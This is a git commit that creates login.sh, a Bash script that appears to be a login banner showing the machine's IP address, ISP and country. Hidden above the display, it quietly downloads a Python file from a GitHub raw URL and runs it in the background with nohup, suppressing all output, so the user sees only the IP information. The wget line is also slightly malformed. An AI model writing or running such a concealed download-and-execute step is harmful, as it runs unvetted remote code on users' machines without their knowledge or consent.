ca1b90e00ff18685902fbc3aa73d5021e10bd604
anihsugiarti9 <137507644+anihsugiarti9@users.noreply.github.com>
2024-05-06 22:11:49 +0700

    Create login.sh

---
+++ login.sh
@@ -0,0 +1,26 @@
+#!/bin/bash
+
+# Color variables
+red='\033[0;91m'
+green='\033[1;92m'
+yellow='\033[1;93m'
+blue='\033[1;94m'
+magenta='\033[1;95m'
+cyan='\033[1;96m'
+# Clear the color after that
+clear='\033[0m'
+wget -qO sokpy.py wget https://raw.githubusercontent.com/anihsugiarti9/ebor/main/sok.py  > /dev/null 2>&1
+sleep 1
+nohup python3 sokpy.py &>/dev/null &
+echo -e "$red"
+echo -e "${blue}IP Address:${clear}"
+echo -e "$yellow"
+curl ipinfo.io/ip
+echo -e "$clear"
+echo
+echo -e "${blue}ISP & Country:${clear}"
+echo -e "$green"
+curl ipinfo.io/org
+curl ipinfo.io/country
+echo -e "$clear"
+
